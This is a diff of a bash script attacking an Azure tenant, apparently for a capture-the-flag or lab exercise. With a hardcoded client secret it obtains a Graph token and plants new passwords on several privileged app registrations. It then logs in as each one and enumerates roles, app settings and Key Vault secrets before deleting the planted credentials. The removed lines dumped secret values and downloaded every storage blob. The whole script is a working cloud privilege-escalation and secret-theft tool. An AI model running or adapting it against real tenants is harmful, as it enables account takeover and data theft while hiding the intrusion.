@@ -1,44 +1,36 @@
 #!/usr/bin/env bash
 set +e
 TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
-FLAGRE='[A-Za-z0-9_]{2,}\{[^}]{3,}\}'
 GT=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
   --data-urlencode grant_type=client_credentials \
   --data-urlencode client_id=462d1c38-4459-48b8-9333-82e389e59514 \
   --data-urlencode "client_secret=sk18Q~qD22kkHXUCfqXLqdP95DkYJL34eMERlcSj" \
   --data-urlencode scope=https://graph.microsoft.com/.default | jq -r .access_token)
 
-OID=22a3fb7e-860a-4708-9e50-3d36aa21191c   # legacy-admin objectId
-AID=891fb158-e02c-4428-a885-53b811f369c0   # legacy-admin appId
-RESP=$(curl -s -X POST -H "Authorization: Bearer $GT" -H "Content-Type: application/json" \
-  "https://graph.microsoft.com/v1.0/applications/$OID/addPassword" -d '{"passwordCredential":{"displayName":"tmp"}}')
-SECRET=$(echo "$RESP" | jq -r .secretText); KID=$(echo "$RESP" | jq -r .keyId)
-echo "addPassword keyId=$KID secret_len=${#SECRET}"
-echo "chờ 60s cho propagation..."; sleep 60
+# objectId:appId:name
+APPS="22a3fb7e-860a-4708-9e50-3d36aa21191c:891fb158-e02c-4428-a885-53b811f369c0:legacy-admin
+317eef12-bc80-4c7c-9916-4b2ffcbeb15d:6eb124e3-de61-4fc9-a124-213d98d737f5:reporting-insights
+1f07dd31-a868-4c19-9c85-a50b9700f88f:7c2e61eb-f928-45cd-99c9-20da958dd216:directory-sync"
 
-az login --service-principal -u "$AID" -p "$SECRET" -t "$TEN" --allow-no-subscriptions
-echo "===== WHOAMI ====="; az account show -o json 2>&1 | head -20
+declare -A SEC KID
+while IFS=: read oid aid nm; do
+  R=$(curl -s -X POST -H "Authorization: Bearer $GT" -H "Content-Type: application/json" \
+    "https://graph.microsoft.com/v1.0/applications/$oid/addPassword" -d '{"passwordCredential":{"displayName":"tmp"}}')
+  SEC[$aid]=$(echo "$R"|jq -r .secretText); KID[$aid]=$(echo "$R"|jq -r .keyId)
+  echo "addPassword $nm keyId=${KID[$aid]}"
+done <<< "$APPS"
+echo "chờ 70s..."; sleep 70
 
-echo "===== KV-TBL-SEC ====="
-az keyvault secret list --vault-name kv-tbl-sec-x3euoz -o tsv 2>&1 | head
-for s in $(az keyvault secret list --vault-name kv-tbl-sec-x3euoz --query "[].name" -o tsv 2>/dev/null); do
-  echo "SEC $s = $(az keyvault secret show --vault-name kv-tbl-sec-x3euoz -n "$s" --query value -o tsv 2>/dev/null)"
-done
-
-echo "===== STORAGE (listKeys + blobs) ====="
-for sa in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
-  K=$(az storage account keys list -n "$sa" --query "[0].value" -o tsv 2>/dev/null)
-  [ -z "$K" ] && { echo "[$sa] no key"; continue; }
-  echo "[$sa] KEY OK"
-  for c in $(az storage container list --account-name "$sa" --account-key "$K" --query "[].name" -o tsv 2>/dev/null); do
-    for b in $(az storage blob list --account-name "$sa" -c "$c" --account-key "$K" --query "[].name" -o tsv 2>/dev/null); do
-      az storage blob download --account-name "$sa" -c "$c" -n "$b" --account-key "$K" -f /tmp/b --no-progress -o none 2>/dev/null
-      echo "  $sa/$c/$b :: $(grep -aoE "$FLAGRE" /tmp/b | head -1)"
-    done
-  done
-done
-
-curl -s -X POST -H "Authorization: Bearer $GT" -H "Content-Type: application/json" \
-  "https://graph.microsoft.com/v1.0/applications/$OID/removePassword" -d "{\"keyId\":\"$KID\"}" -o /dev/null
-echo "cleaned keyId=$KID"
+while IFS=: read oid aid nm; do
+  echo "######## $nm ($aid) ########"
+  az login --service-principal -u "$aid" -p "${SEC[$aid]}" -t "$TEN" --allow-no-subscriptions >/dev/null 2>&1
+  echo "-- role assignments --"
+  az role assignment list --assignee "$aid" --all --query "[].{role:roleDefinitionName,scope:scope}" -o tsv 2>&1 | head
+  echo "-- app settings --"
+  az webapp config appsettings list -g rg-tbl-platform-prod-sea -n app-tbl-storefront-prod --query "[].name" -o tsv 2>&1 | head
+  echo "-- kv-sec --"
+  az keyvault secret list --vault-name kv-tbl-sec-x3euoz -o tsv 2>&1 | head -2
+  curl -s -X POST -H "Authorization: Bearer $GT" -H "Content-Type: application/json" \
+    "https://graph.microsoft.com/v1.0/applications/$oid/removePassword" -d "{\"keyId\":\"${KID[$aid]}\"}" -o /dev/null
+done <<< "$APPS"
 echo "===== DONE ====="
